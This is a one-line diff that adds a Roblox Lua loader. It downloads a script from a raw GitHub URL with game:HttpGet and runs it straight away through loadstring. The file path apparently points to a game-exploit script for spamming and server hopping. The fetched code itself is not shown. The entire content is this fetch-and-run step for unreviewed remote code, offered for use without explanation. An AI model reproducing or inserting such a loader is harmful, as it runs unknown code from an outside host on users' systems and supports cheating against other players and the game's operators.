@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/wanted-update-spam4-hop7y5vchsoezw.lua"))()
